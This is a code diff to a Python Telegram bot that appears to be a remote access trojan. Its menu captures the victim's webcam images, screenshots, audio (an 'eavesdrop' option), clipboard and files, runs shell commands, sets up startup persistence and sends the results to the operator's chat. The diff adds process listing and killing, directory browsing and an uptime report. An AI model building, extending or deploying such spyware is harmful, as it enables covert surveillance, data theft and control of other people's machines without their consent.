@@ -9,6 +9,7 @@ import subprocess
 import sys
 import getpass
 import requests
+import datetime
 import config as cfg
 from Modules import (
     ip_info,
@@ -25,11 +26,12 @@ from Modules import (
     wifi_scanner,
     open_website,
     file_mgmt,
-    startup
+    startup,
+    task_kill
 )
 
 
-
+boot_time = datetime.datetime.now()
 api_key = cfg.apiKey
 chat_id = cfg.chatID
 
@@ -47,6 +49,7 @@ def listToString(s):
 
 async def main_menu(update: Update, context):
     keyboard = [
+        [InlineKeyboardButton("🔗 https://github.com/infermiere", callback_data="git_hub")],
         [InlineKeyboardButton("📟 Get IP", callback_data="Get_IP")],
         [InlineKeyboardButton("📸 Get Screenshot", callback_data="get_Screenshot")],
         [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
@@ -63,7 +66,14 @@ async def main_menu(update: Update, context):
                 "🔑 Perform Shell Commands", callback_data="shell_commands"
             )
         ],
+        [
+            InlineKeyboardButton(
+                "⌛ See the uptime", callback_data="get_upt"
+            )
+        ],
         [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
+        [InlineKeyboardButton("➡️ Change directory", callback_data="file_cd")],
+        [InlineKeyboardButton("🗃️ Show files in folder", callback_data="file_ls")],
         [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
         [
             InlineKeyboardButton(
@@ -74,6 +84,11 @@ async def main_menu(update: Update, context):
         [
             InlineKeyboardButton(
                 "⚠️ Show Alert Box with given message", callback_data="show_popup"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                "🗓️ Manage processes ", callback_data="tsk_mng"
             )
         ],
         [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
@@ -96,10 +111,13 @@ async def main_menu(update: Update, context):
     chat_id=msg.chat_id, message_id=msg.message_id
 )
 
-def speak(update, context):
+async def speak(update, context):
     inputs = (update.message.text).split()
     Crt_values = listToString(inputs[1:])
     text_speaker.text_speaker(Crt_values)
+    await application.bot.send_message(
+            chat_id=chat_id, text="Done ✅"
+        )
 
 async def cd_dot(update, context):
     await application.bot.send_message(
@@ -122,6 +140,29 @@ async def file_ls(update, context):
     await application.bot.send_message(
             chat_id=chat_id, text=file_mgmt.dir_ls(dir)
         )
+
+async def uptm(update, context):
+    current_time = datetime.datetime.now()
+    uptime_duration = current_time - boot_time
+    days, remainder = divmod(uptime_duration.total_seconds(), 86400)
+    hours, remainder = divmod(remainder, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    uptime_str = (f"⏲️ Uptime: {int(days)} days, {int(hours)} hours, "
+                    f"{int(minutes)} minutes, {int(seconds)} seconds.")
+    await application.bot.send_message(
+            chat_id=chat_id, text=uptime_str
+        )
+async def tsk_kill(update, context):
+    inputs = (update.message.text).split()
+    task = listToString(inputs[1:])
+    if len(task) != 0:
+        await application.bot.send_message(
+            chat_id=chat_id, text=task_kill.ktask(int(task))
+                            )
+    else:
+        ftask = task_kill.ltask()
+        await application.bot.send_document(chat_id=chat_id, document=open(ftask, "rb"), caption="List of all open processes.\nTo close a process, run the /ktask <pid> command")
+        os.remove(ftask)
 
 
 async def chat_message(update, context):
@@ -208,21 +249,31 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = query.data
     
     if result == "get_Webcam":
-
-        if not webcam_snap.webcam_snap() == "Error":
+        web_ss = webcam_snap.webcam_snap()
+        if not web_ss == "Error":
             await application.bot.send_document(
                 chat_id=chat_id,
                 caption=username + "'s Webcam Snap",
-                document=open("webcam.jpg", "rb"),
+                document=open(web_ss, "rb"),
             )
-            os.remove("webcam.jpg")
+            os.remove(web_ss)
         else:
             await application.bot.send_message(
             chat_id=chat_id,
             text="I couldn't open a webcam",
         )
-
+    elif result == "get_upt":
+        await application.bot.send_message(
+            chat_id=chat_id,
+            text="To see the uptime, use /uptime",
+        )
+    elif result == "git_hub":
+        await application.bot.send_message(
+            chat_id=chat_id,
+            text="🔗 https://github.com/infermiere\n💬 @primogirone",
+        )
     elif result == "get_system_info":
+
         sys_info = system_info.system_info()
         await application.bot.send_message(
             chat_id=chat_id,
@@ -259,13 +310,13 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             + ip_address_info["city"], parse_mode="HTML"
         )
     elif result == "get_Screenshot":
-        screen_shot.screen_shot()
+        ss = screen_shot.screen_shot()
         await application.bot.send_photo(
             chat_id=chat_id,
             caption=username + "'s Screenshot",
-            photo=open("Screenshot.png", "rb"),
+            photo=open(ss, "rb"),
         )
-        os.remove("Screenshot.png")
+        os.remove(ss)
 
     elif result == "eavesdrop":
         
@@ -302,6 +353,15 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         move_mouse.move_mouse()
         await application.bot.send_message(chat_id=chat_id, text="✅️ Done!")
+
+    elif result == "tsk_mng":
+        await application.bot.send_message(chat_id=chat_id, text="To manage processes, use /ktask")
+
+    elif result == "file_ls":
+        await application.bot.send_message(chat_id=chat_id, text="To show files in folder, use /ls")
+    
+    elif result == "file_cd":
+        await application.bot.send_message(chat_id=chat_id, text="To change directory, use /cd <path>")
 
     elif result == "send_keypress":
         await application.bot.send_message(
@@ -376,6 +436,8 @@ def start_bot():
     application.add_handler(CommandHandler("cd_dot", cd_dot))
     application.add_handler(CommandHandler("cd", cd_dir))
     application.add_handler(CommandHandler("ls", file_ls))
+    application.add_handler(CommandHandler("ktask", tsk_kill))
+    application.add_handler(CommandHandler("uptime", uptm))
 
     application.add_handler(CallbackQueryHandler(button))
     
